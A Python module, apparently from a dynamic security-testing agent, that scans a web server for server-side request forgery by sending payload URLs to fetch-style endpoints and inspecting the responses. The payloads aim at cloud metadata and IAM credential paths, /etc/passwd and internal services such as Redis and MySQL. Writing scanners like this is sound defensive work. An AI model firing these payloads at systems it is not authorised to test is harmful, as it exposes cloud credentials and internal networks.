"""
Server-Side Request Forgery (SSRF) vulnerability testing for the Dynamic Analysis Agent.
"""

import requests
from urllib.parse import urljoin

def test_ssrf(base_url):
    """
    Test for Server-Side Request Forgery (SSRF) vulnerabilities.

    Args:
        base_url (str): Base URL to test

    Returns:
        list: List of detected vulnerabilities
    """
    vulnerabilities = []

    ssrf_payloads = [
        "http://127.0.0.1:80",
        "http://localhost:80",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
        "http://169.254.170.2/v2/metadata",  # Azure metadata
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://localhost:11211/",  # Memcached
        "ftp://localhost:21/",
        "ldap://localhost:389/",
        "http://internal-service:8080/admin",
        "http://127.0.0.1:22",  # SSH
        "http://127.0.0.1:3306",  # MySQL
        "http://127.0.0.1:6379",  # Redis
    ]

    test_endpoints = [
        urljoin(base_url, "/fetch"),
        urljoin(base_url, "/proxy"),
        urljoin(base_url, "/url"),
        urljoin(base_url, "/load"),
        urljoin(base_url, "/get"),
        urljoin(base_url, "/api/fetch"),
        urljoin(base_url, "/webhook"),
        urljoin(base_url, "/callback")
    ]

    for endpoint in test_endpoints:
        for payload in ssrf_payloads:
            try:
                params = {"url": payload, "uri": payload, "link": payload, "src": payload, "path": payload}
                response = requests.get(endpoint, params=params, timeout=10)

                # Check for SSRF indicators
                response_text = response.text.lower()

                ssrf_indicators = [
                    "connection refused", "connection timeout", "no route to host",
                    "internal server error", "service unavailable",
                    "root:", "daemon:", "bin/bash",  # File content
                    "meta-data", "computeMetadata", "iam/security-credentials",  # Cloud metadata
                    "memcached", "version", "uptime",  # Service responses
                    "ftp", "ldap", "ssh", "mysql", "redis"  # Protocol responses
                ]

                # Check for successful SSRF (server accessed internal resource)
                if response.status_code in [200, 201, 202] and any(indicator in response_text for indicator in ssrf_indicators):
                    vulnerabilities.append({
                        "type": "Server-Side Request Forgery (SSRF)",
                        "endpoint": endpoint,
                        "payload": payload,
                        "method": "GET",
                        "evidence": "Internal resource access successful"
                    })

                # Check for SSRF attempts that failed but show vulnerability exists
                elif response.status_code in [400, 403, 404, 500] and "127.0.0.1" in payload:
                    # Server blocked the request but tried to make it
                    error_indicators = ["blocked", "forbidden", "denied", "firewall", "internal"]
                    if any(indicator in response_text for indicator in error_indicators):
                        vulnerabilities.append({
                            "type": "Server-Side Request Forgery (SSRF)",
                            "endpoint": endpoint,
                            "payload": payload,
                            "method": "GET",
                            "evidence": "Request blocked but SSRF attempt detected"
                        })

                # Check for time-based SSRF (slow responses indicate server made request)
                if response.elapsed.total_seconds() > 8:
                    vulnerabilities.append({
                        "type": "Server-Side Request Forgery (SSRF)",
                        "endpoint": endpoint,
                        "payload": payload,
                        "method": "GET",
                        "evidence": "Slow response indicates external request made"
                    })

            except requests.RequestException:
                continue

    return vulnerabilities
